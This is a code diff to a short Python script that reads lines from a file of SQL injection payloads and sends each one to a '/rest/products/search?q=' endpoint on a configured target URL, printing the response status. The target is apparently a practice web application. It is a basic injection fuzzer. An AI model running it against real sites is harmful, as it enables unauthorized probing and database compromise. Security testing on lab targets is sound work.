@@ -1,22 +1,18 @@
-import json
+
 import requests
 
 from plugins import attack as a
-from plugins import header_config as hc
 
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+f = open('SQL_injection_payloads.txt','r')
 
-print(a.TEST_COOKIE == hc.TEST_COOKIE)
-print(a.TEST_COOKIE)
-
-new_token = "23479"
-new_cookie = {}
-new_cookie = a.TEST_COOKIE.copy()
-new_cookie["token"] = new_token
-#print(new_cookie)
-print(a.TEST_COOKIE["token"] == new_token)
-print(a.TEST_COOKIE)
-
-from urllib import parse
+while True:
+    line = f.readline()
+    if line:
+        payload = a.URL+"/rest/products/search?q="+line
+        print(payload)
+        response = requests.get(payload)
+        print(response.status_code)
+    else:
+        break
+f.close()
 
